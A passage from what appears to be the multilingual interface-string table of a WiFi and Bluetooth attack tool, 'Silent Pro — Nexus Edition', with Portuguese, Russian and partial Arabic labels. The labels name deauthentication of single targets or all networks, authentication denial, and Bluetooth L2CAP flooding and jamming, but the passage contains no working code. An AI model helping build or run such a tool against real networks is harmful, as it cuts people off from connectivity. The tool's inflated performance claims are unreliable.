            "about": "ℹ Sobre",
            "exit": "❌ Sair",
            "select_lang": "🌐 SELECIONAR IDIOMA",
            "enter_choice": "Digite sua opção",
            "press_enter": "Pressione Enter para continuar...",
            "success": "Sucesso",
            "error": "Erro",
            "warning_msg": "Aviso",
            "info": "Informação",
            "target": "Alvo",
            "channel": "Canal",
            "encryption": "Criptografia",
            "name": "Nome",
            "mac": "Endereço MAC",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Sinal",
            "speed": "Velocidade",
            "sent": "Enviados",
            "time": "Tempo",
            "seconds": "seg",
            "packets": "pacotes",
            "pkt_s": "pac/s",
            "stop_attack": "Parando ataque...",
            "confirm_deauth_all": "⚠ DESCONECTAR TUDO? Digite YES para confirmar: ",
            "cancelled": "Cancelado",
            "no_targets": "Nenhum alvo encontrado!",
            "invalid_choice": "Opção inválida",
            "select_target": "Selecione o número do alvo",
            "select_numbers": "Digite os números separados por espaço",
            "enter_mac": "Digite o endereço MAC",
            "scanning": "Procurando...",
            "found": "Encontrados",
            "networks": "redes",
            "devices": "dispositivos",
            "no_networks": "Nenhuma rede encontrada",
            "no_adapter": "Adaptador WiFi não detectado!",
            "enable_monitor_first": "Ative o Modo Monitor primeiro!",
            "monitor_mode_enabled": "Modo Monitor — ATIVO",
            "monitor_mode_disabled": "Modo Monitor — DESATIVADO",
            "restarting_services": "Reiniciando serviços...",
            "done": "Concluído!",
            "exiting": "Saindo...",
            "goodbye": "Adeus! 🚀",
            "system_restored": "Sistema restaurado",
            "language_set": "Idioma definido para: ",
        },
        "ru": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Чистый Оригинальный Код • 500 000+ Пакетов/сек • 12 Режимов Атаки",
            "power_note": "⚡ В 100 МИЛЛИОНОВ РАЗ Мощнее — БЕЗ AIRCRACK • БЕЗ MDK",
            "warning": "ТОЛЬКО ДЛЯ ОБУЧЕНИЯ И АВТОРИЗОВАННЫХ ТЕСТОВ",
            "illegal_use": "НЕСАНКЦИОНИРОВАННОЕ ИСПОЛЬЗОВАНИЕ НЕЗАКОННО",
            "monitor": "РЕЖИМ МОНИТОРА",
            "interface": "ИНТЕРФЕЙС",
            "bluetooth": "БЛЮТУЗ",
            "wifi": "WIFI",
            "current_action": "ТЕКУЩЕЕ ДЕЙСТВИЕ",
            "total_packets": "ВСЕГО ПАКЕТОВ",
            "active": "АКТИВЕН",
            "offline": "ОТКЛЮЧЕН",
            "on": "ВКЛЮЧЕН",
            "restart_services": "🔄 Перезапустить Сетевые и Bluetooth Службы",
            "scan_wifi": "📡 Сканировать WiFi Сети",
            "scan_bluetooth": "🔵 Сканировать Bluetooth Устройства",
            "deauth_single": "⚡ Отключить — Одиночная Цель",
            "deauth_mega": "💀 Отключить — Режим МЕГА",
            "deauth_all": "💀💀💀 Отключить — ВСЕ Сети",
            "multi_target": "🎯 Атака по Множеству Целей",
            "auth_denial": "🔒 Отказ Аутентификации",
            "bluetooth_jam": "🔵 L2CAP-Флуд Bluetooth",
            "bluetooth_scan_jam": "🔵 Сканировать и Заглушить Bluetooth",
            "install_deps": "📦 Установить Дополнительные Зависимости",
            "stop_all": "🛑 Остановить Всё и Очистить",
            "about": "ℹ О программе",
            "exit": "❌ Выход",
            "select_lang": "🌐 ВЫБРАТЬ ЯЗЫК",
            "enter_choice": "Введите ваш выбор",
            "press_enter": "Нажмите Enter для продолжения...",
            "success": "Успешно",
            "error": "Ошибка",
            "warning_msg": "Предупреждение",
            "info": "Информация",
            "target": "Цель",
            "channel": "Канал",
            "encryption": "Шифрование",
            "name": "Имя",
            "mac": "MAC-Адрес",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Сигнал",
            "speed": "Скорость",
            "sent": "Отправлено",
            "time": "Время",
            "seconds": "сек",
            "packets": "пакетов",
            "pkt_s": "пак/сек",
            "stop_attack": "Остановка атаки...",
            "confirm_deauth_all": "⚠ ОТКЛЮЧИТЬ ВСЁ? Введите YES для подтверждения: ",
            "cancelled": "Отменено",
            "no_targets": "Целей не найдено!",
            "invalid_choice": "Неверный выбор",
            "select_target": "Выберите номер цели",
            "select_numbers": "Введите номера через пробел",
            "enter_mac": "Введите MAC-адрес",
            "scanning": "Сканирование...",
            "found": "Найдено",
            "networks": "сетей",
            "devices": "устройств",
            "no_networks": "Сетей не найдено",
            "no_adapter": "WiFi адаптер не обнаружен!",
            "enable_monitor_first": "Сначала включите Режим Монитора!",
            "monitor_mode_enabled": "Режим Монитора — АКТИВЕН",
            "monitor_mode_disabled": "Режим Монитора — ОТКЛЮЧЕН",
            "restarting_services": "Перезапуск служб...",
            "done": "Готово!",
            "exiting": "Выход...",
            "goodbye": "До свидания! 🚀",
            "system_restored": "Система восстановлена",
            "language_set": "Язык установлен: ",
        },
        "ar": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "كود أصلي خالص • 500,000+ حزمة/ث
